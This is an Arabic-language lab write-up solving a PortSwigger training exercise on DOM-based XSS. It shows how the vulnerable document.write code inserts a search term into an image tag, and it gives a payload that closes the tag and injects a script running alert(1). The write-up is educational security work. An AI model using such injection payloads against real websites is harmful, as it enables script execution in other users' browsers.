## 1. معلومات عامة

- **اسم اللاب / الموقع:** PortSwigger/ https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink
- **تاريخ الحل:** 26/4
- **نوع الثغرة:** ( DOM-Based)
---
# ملاحظات حل اللاب

## وصف اللاب

- كان يوجد **input field** للبحث.
    
- بحثت عن كلمة `z3rob` كتجربة.

    ![[Pasted image 20250426182413.png]]

## فحص الكود المصدري (Source Code Review)
![[Pasted image 20250426182603.png]]
- وجدت الكود التالي:
    
    ```javascript
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    ```
    
    ![[Pasted image 20250426184257.png]]
- الملاحظة:
    
    - قيمة المستخدم (`query`) يتم حقنها داخل خاصية `src` لعنصر `<img>` بدون أي فلترة أو ترميز (Encoding).
        
    - يتم ذلك باستخدام `document.write`، مما يسمح بكتابة كود HTML إضافي في الصفحة.
        

## الفكرة للهجوم (Exploit Idea)

- الهدف: **الخروج من وسوم `<img>`** وحقن كود JavaScript.
    
- الطريقة:
    
    - إغلاق وسم `<img>` المفتوح.
        
    - حقن سكربت جديد.
        

## التجربة (Testing)

- أدخلت القيمة التالية في البحث:
    
    ```html
    "><script>alert(1)</script>z3rob
    ```
    
- النتيجة:
    
    - الكود الناتج في الـ DOM أصبح:
        
        ```html
        <img src="/resources/images/tracker.gif?searchTerms="><script>alert(1)</script>z3rob">
        ```
        
    - وتم تنفيذ السكربت بنجاح وظهور تنبيه (alert).
        ![[Pasted image 20250426184046.png]]

![[Pasted image 20250426184054.png]]

## الخلاصة

- السبب الرئيسي للثغرة: استخدام **`document.write`** مع **إدخال المستخدم** بدون حماية أو فلترة